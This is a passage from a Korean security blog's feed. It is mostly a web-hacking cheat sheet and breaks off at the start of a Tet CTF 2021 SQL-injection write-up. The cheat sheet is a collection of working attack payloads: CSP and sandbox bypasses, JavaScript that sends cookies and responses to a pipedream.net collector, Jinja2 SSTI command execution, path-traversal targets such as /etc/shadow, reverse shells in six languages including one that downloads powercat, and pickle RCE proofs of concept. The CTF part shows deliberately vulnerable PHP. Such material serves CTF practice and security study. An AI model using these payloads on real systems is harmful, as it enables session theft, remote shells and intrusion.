class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>iframe sandbox bypass<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;xss payoad&quot;</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line">              .contentWindow</span><br><span class="line"><span class="javascript">              .postMessage(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;exploit()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;pocas&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://domain/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass<br></h2><p><span style="color:#21C587">&#35;</span><strong> Use an accepted domain</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; http:&#x2F;&#x2F;141.164.52.207</span><br></pre></td></tr></table></figure><p><strong>위와 같이 나 자신과 특정(<a href="http://141.164.52.207/">http://141.164.52.207</a>) 도메인에서 오는 스크립트는 실행이 가능한 경우, 해당 서버에 파일(xss poc)을 업로드하고, poc 코드를 불러오면 위와 같은 CSP를 우회할 수 있습니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong> Header Injection</strong><br></p><p><strong>만약 헤더 인젝션이 가능하다고 가정하에 응답 코드를 102와 같은 것들로 수정하면 브라우저는 CSP를 해석하지 않아 우회가 가능합니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong> AngularJS xss</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; script-src &#39;self&#39; cdnjs.cloudflare.com;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;url&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>만약 위와 같이 <code>cdnjs.cloudflare.com</code>와 같이 AngularJS를 가져와서 사용할 수 있을 경우 AngularJS XSS를 이용하면 CSP를 우회할 수 있고, 예시 페이로드는 위와 같습니다.</strong><br></p><p><span style="color:#21C587">&#35;</span><strong> CSP Option ↔ Bypass</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: </span><br><span class="line">default-src &#x27;self&#x27; data: *; connect-src &#x27;self&#x27;; script-src  &#x27;self&#x27; ;</span><br><span class="line">report-uri /_csp; upgrade-insecure-requests</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src https://google.com &#x27;unsafe-eval&#x27; data: http://*; </span><br><span class="line">child-src &#x27;none&#x27;; </span><br><span class="line">report-uri /Report-parsing-url;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Javascript-Payload"><a href="#Javascript-Payload" class="headerlink" title=" Javascript Payload"></a><span style="color:#21C587"></span> Javascript Payload<br></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;https://pocas.kr&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  headers: &#123;<span class="string">&#x27;headerName&#x27;</span>:<span class="string">&#x27;headerValue&#x27;</span>&#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="params">x</span>=&gt;</span>x.text()).then(<span class="function"><span class="params">x</span>=&gt;</span>fetch(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span>+x));</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;https://pocas.kr&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  headers: &#123;<span class="string">&#x27;headerName&#x27;</span>:<span class="string">&#x27;headerValue&#x27;</span>&#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;<span class="keyword">return</span> x.text();&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">xx</span>)</span>&#123;fetch(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span>+xx)&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">x.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span> + <span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span><br><span class="line">x.send();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`fs`</span>).readdirSync(<span class="string">`./`</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20&lt;FILE&gt;`</span>).toString()</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 아래 코드는 파일의 이름이 &#x27;T&#x27;로 시작하는 파일을 모두 읽는 코드이다. 만약 읽으려는 파일의 이름이 &#x27;F&#x27;로 시작한다면 &#x27;F\x2a&#x27;를 주면된다.</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20T\x2a`</span>).toString()</span><br></pre></td></tr></table></figure><hr><h2 id="SSTI"><a href="#SSTI" class="headerlink" title=" SSTI"></a><span style="color:#21C587"></span> SSTI<br></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123; [].<span class="keyword">class</span>.base.subclasses() &#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.mro()[<span class="number">1</span>].subclasses()&#125;&#125;</span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__() &#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.mro()[<span class="number">1</span>].__subclasses__()[<span class="number">396</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request|attr(request.args.param)&#125;&#125;&amp;param=__class__</span><br><span class="line">&#123;&#123;request[request.args.param]&#125;&#125;&amp;param=__class__</span><br><span class="line">&#123;&#123;request|attr([request.args.usc*<span class="number">2</span>,request.args.<span class="keyword">class</span>,request.args.usc*<span class="number">2</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;class&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([<span class="string">&quot;__&quot;</span>,<span class="string">&quot;class&quot;</span>,<span class="string">&quot;__&quot;</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;request.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(request.args.f|<span class="built_in">format</span>(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fbase\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;</span>)()&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fbase\x5f\x5f’)|attr(‘\x5f\x5fsubclasses\x5f\x5f&#x27;</span>)()|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="number">287</span>)(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>)|attr(<span class="string">&#x27;communicate&#x27;</span>)()|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="number">0</span>)|attr(<span class="string">&#x27;decode&#x27;</span>)(<span class="string">&#x27;utf-8&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Path-Traversal"><a href="#Path-Traversal" class="headerlink" title=" Path Traversal"></a><span style="color:#21C587"></span> Path Traversal<br></h2><p><span style="color:#21C587">&#35;</span><strong> Ubuntu</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;issue</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;motd</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;exe</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">package.json</span><br></pre></td></tr></table></figure><hr><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell<br></h2><p><span style="color:#21C587">&#35;</span><strong> Bash</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1&#39;</span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> PHP</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;domain&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Python</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;kaibro.tw&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node.js</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>), sh = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket(); client.connect(port, <span class="string">&quot;domain&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Ruby</strong><br></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;domain&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Powershell</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c domain -p port -e cmd</span><br></pre></td></tr></table></figure><hr><h2 id="Python-Pickle-RCE-PoC"><a href="#Python-Pickle-RCE-PoC" class="headerlink" title="Python Pickle RCE PoC"></a>Python Pickle RCE PoC<br></h2><p><span style="color:#21C587">&#35;</span><strong> eval</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    x = <span class="string">&quot;open(&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;).read()&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (__builtins__.<span class="built_in">eval</span>, (x,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> os.system</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><hr><h2 id="IPv4-to-IP-Decimal-Conversion"><a href="#IPv4-to-IP-Decimal-Conversion" class="headerlink" title=" IPv4 to IP Decimal Conversion"></a><span style="color:#21C587"></span> IPv4 to IP Decimal Conversion<br></h2><p><a href="https://www.ipaddressguide.com/ip">Link</a></p><hr><p><em>Reference</em> : <a href="https://www.anquanke.com/post/id/176185">https://www.anquanke.com</a><br><br><em>Reference</em> : <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a><br><br><em>Reference</em> : <a href="https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/">https://bittherapy.net/post/~/</a><br><br><em>Reference</em> : <a href="https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951">https://medium.com/@schopath/~</a><br><br><em>Reference</em> : <a href="https://twitter.com/HolyBugx/status/1348928810620743682">https://twitter.com/HolyBugx</a><br><br><em>Reference</em> : <a href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br><br><em>Reference</em> : <a href="https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd">https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd</a><br><br><em>Reference</em> : <a href="https://hackerone.com/reports/1024734">https://hackerone.com/reports/1024734</a><br><br><em>Reference</em> : <a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">https://medium.com/@nyomanpradipta120/~</a><br><br><em>Reference</em> : <a href="https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss">https://portswigger.net/research/~</a><br><br><em>Reference</em> : <a href="https://www.ipaddressguide.com/ip">vhttps://www.ipaddressguide.com/ip</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tet CTF 2021 Write Up</title>
      <link href="2021/01/03/2021-01-03-TetCTF/"/>
      <url>2021/01/03/2021-01-03-TetCTF/</url>
      
        <content type="html"><![CDATA[<p><strong>2021년 1월 1일 오전 9시부터 Tet CTF라는 대회가 열렸습니다. 그래서 이번 대회에서 출제된 SQL Injectino 문제의 풀이를 작성해보겠습니다. 사실 대회는 2일동안 진행했는데 1시간도 안 했음,, 게임 한다고,,</strong></p><hr><p><b><em><span style="color:#21C587">&#35;</span> mysqlimit [100pts]</em></b><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- The Author of this challenge is so kind <span class="keyword">and</span> handsome that he is giving you flag, just need to bypass his god-tier waf <span class="keyword">and</span> grab it &lt;<span class="number">3</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;dbconnect.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// filter all what i found on internet.... dunno why ｡ﾟ･（&gt;﹏&lt;）･ﾟ｡</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\&lt;|\&gt;|\=/is&#x27;</span> , <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;img src=&quot;https://i.imgur.com/C42ET4u.gif&quot; /&gt;&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// prevent sql injection</span></span><br><span class="line">        <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;select * from flag_here_hihi where id=&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$run_query</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$run_query</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;    </span><br><span class="line">            <span class="comment">// I&#x27;m kidding, just the name of flag, not flag :(</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$run_query</span>-&gt;fetch_array()[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$res</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>일단 preg_match() 함수를 이용해서 수 많은 키워드를 필터링하고 있는 것을 볼 수 있습니다. 그리고 id 값이 1일때, 2일때의 출력값이 다르므로 Blind Based SQL Injection을 이용해 <code>flag</code>를 뽑아야겠다 생각이 들었습니다.</strong><br><br></p><p><strong>하지만 <code>culumn</code>이라는 키워드가 필터링이 걸려 있어 <code>flag</code>가 들어있는 컬럼을 Blind Based SQL Injection을 이용해서 뽑아올 수 없을 거 같다는 생각이 들었습니다. 왜냐하면 <code>information_schema.columns</code>라는 메타 테이블에서 <code>column_name</code>을 조회해야 하는데 필터링에 때문에 불가능하기 때문입니다.</strong><br><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.51.35.png?raw=true"><br><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.56.37.png?raw=true"></p><p><strong>그러다가 N1 CTF에서 <code>exp()</code> 함수를 이용해서 Error Based Blind SQL Injection을 이용한 적이 있어서 위와 같이 MySQL의 <code>exp()</code>함수를 이용해서 <code>Overflow</code>를 일으켜 에러에 내가 원하는 값(Column Name)을 포함시키는 방식으로 해결하려 했지만 <code>exp()</code> 함수를 필터링하고 있었습니다. 아마 이 방법을 못 쓰게 방지한 거 같습니다. 그래서 그냥 새해니 쉴려고 접고, 롤을 했었습니다. 그러다 오늘 아침에 다시 확인을 해보니 <code>exp()</code> 함수 대신 <code>pow()</code> 함수를 이용해도 잘 되는 것을 확인할 수 있었습니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%207.01.29.png?raw=true"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 